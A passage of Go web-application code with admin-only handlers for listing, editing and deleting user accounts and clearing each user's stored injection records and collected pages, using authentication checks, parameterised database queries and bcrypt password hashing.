	response.Results = []models.AdminUserDTO{}

	for i := range users {

		var userDto models.AdminUserDTO
		userDto.UUID = users[i].UUID
		userDto.FullName = users[i].FullName
		userDto.Email = users[i].Email
		userDto.Domain = users[i].Domain
		userDto.IsAdmin = users[i].IsAdmin
		userDto.Username = users[i].Username

		userDto.Attributes = []string{}

		if users[i].IsAdmin {
			userDto.Attributes = append(userDto.Attributes, "Admin")
		}

		if users[i].SSOSubject != "" {
			userDto.Attributes = append(userDto.Attributes, "SSO User")
		}

		response.Results = append(response.Results, userDto)
	}

	response.Total = count
	response.Success = true

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(&response)

}

func (a *Application) adminDeleteUser(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil || !user.IsAdmin {
		http.NotFound(w, r)
		return
	}

	var toDelete models.Base
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		models.Message(w, false, "Bad Request")
		return
	}

	var deletedUser models.User
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("uuid = ?", toDelete.UUID).Delete(&deletedUser).Error; err != nil {
		log.Println("failed", err)

		models.Message(w, false, "Not found")
		return
	}

	if err := a.deleteUserData(deletedUser.UUID, deletedUser.OwnerCorrelationKey); err != nil {
		log.Println("failed to clear user data after user has been deleted: ", err)
		models.Message(w, false, "Not found")
		return
	}

	log.Printf("Admin deleted User %q (%s)", deletedUser.Username, deletedUser.UUID)

	models.Message(w, true, "User deleted!")

}

func (a *Application) adminEditUser(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil || !user.IsAdmin {
		http.NotFound(w, r)
		return
	}

	var userDetailsToUpdate models.AdminEditUserRequest
	err := jsonDecoder(r.Body).Decode(&userDetailsToUpdate)
	if err != nil {
		models.Message(w, false, "Bad Request")
		return
	}

	var userToEdit models.User
	if err := a.db.Where("uuid = ?", userDetailsToUpdate.UUID).First(&userToEdit).Error; err != nil {
		log.Println("failed", err)

		models.Message(w, false, "Not found")
		return
	}

	if userToEdit.IsAdmin {
		models.Message(w, false, "Cannot edit admin user details")
		return
	}

	if userToEdit.UUID == user.UUID {
		models.Message(w, false, "Cannot edit own details")
		return
	}

	userToEdit.IsAdmin = userDetailsToUpdate.IsAdmin
	if userDetailsToUpdate.Domain != "" {
		userToEdit.Domain = userDetailsToUpdate.Domain
	}

	if userDetailsToUpdate.NewPassword != "" {

		b, err := bcrypt.GenerateFromPassword([]byte(userDetailsToUpdate.NewPassword), 10)
		if err != nil {
			models.Message(w, false, "Server Error")
			return
		}

		userToEdit.Password = string(b)
	}

	if err := a.db.Save(&userToEdit).Error; err != nil {
		log.Println("failed", err)

		models.Message(w, false, "Not found")
		return
	}

	log.Printf("Admin edit User %q (%s)", userToEdit.Username, userToEdit.UUID)

	models.Message(w, true, "User edited!")

}

func (a *Application) deleteUserData(UUID uuid.UUID, OwnerCorrelationKey string) error {
	var errs []error
	if err := a.db.Unscoped().Where("owner_id = ?", UUID).Delete(&models.Injection{}).Error; err != nil {
		errs = append(errs, fmt.Errorf("failed to delete injections: %s", err))
	}

	if err := a.db.Unscoped().Where("owner_id = ?", UUID).Delete(&models.CollectedPage{}).Error; err != nil {
		errs = append(errs, fmt.Errorf("failed to collected pages: %s", err))
	}

	if err := a.db.Unscoped().Where("owner_correlation_key = ?", OwnerCorrelationKey).Delete(&models.InjectionRequest{}).Error; err != nil {
		errs = append(errs, fmt.Errorf("failed to delete injection requests: %s", err))
	}

	return errors.Join(errs...)
}

func (a *Application) adminDeleteUserData(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil || !user.IsAdmin {
		http.NotFound(w, r)
		return
	}

	var userDataToDelete models.Base
	err := jsonDecoder(r.Body).Decode(&userDataToDelete)
	if err != nil {
		models.Message(w, false, "Bad Request")
		return
	}

	var targetUser models.User
	if err := a.db.Where("uuid = ?", userDataToDelete.UUID).First(&targetUser).Error; err != nil {
		log.Println("failed", err)

		models.Message(w, false, "Not found")
		return
	}

	if err := a.deleteUserData(targetUser.UUID, targetUser.OwnerCorrelationKey); err != nil {
		log.Println("failed to clear user data: ", err)
		models.Message(w, false, "Not found")
		return
	}

	log.Printf("Admin deleted User %q (%s) data", targetUser.Username, targetUser.UUID)

	models.Message(w, true, "User data deleted!")

}
